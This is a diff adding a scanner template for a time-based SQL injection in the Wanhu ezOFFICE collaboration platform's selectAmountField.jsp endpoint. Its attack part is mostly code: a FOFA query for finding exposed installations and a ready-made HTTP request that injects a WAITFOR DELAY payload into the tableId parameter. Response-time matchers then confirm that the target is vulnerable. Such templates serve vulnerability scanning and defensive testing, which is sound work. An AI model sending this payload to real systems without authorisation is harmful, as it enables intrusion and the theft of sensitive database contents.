@@ -1,0 +1,26 @@
+## id: VEID-2025-0118
+## name: 万户 ezOFFICE selectAmountField.jsp SQL注入
+## author: hack007x
+## severity: critical
+## tags: veid,sql,veid2025
+## description: selectAmountField .jsp接口处存在sql注入漏洞，攻击者可获取数据库中敏感信息
+## fofa-query: app="ezOFFICE协同管理平台"
+## verification: true
+
+
+GET /defaultroot/platform/custom/custom_database/dropdownselect/selectAmountField.jsp;.js?tableId=11%20Waitfor%20delay%20'0:0:7'%20%2d%2d%20 HTTP/1.1
+Host: {{Hostname}}
+User-Agent: {{random_ua}}
+
+
+#@ timeout: 20
+#@ condition: and
+#@ matcher: status_code == 200
+#@ matcher: response_time > 7
+#@ matcher: body contains "<select"
+
+
+
+
+
+# @VEIL-STAMP: 3d1e92d59045287aee312d7866eadb9c4b9d9a3f7ffc40cbbc89ef5a4b0b0672
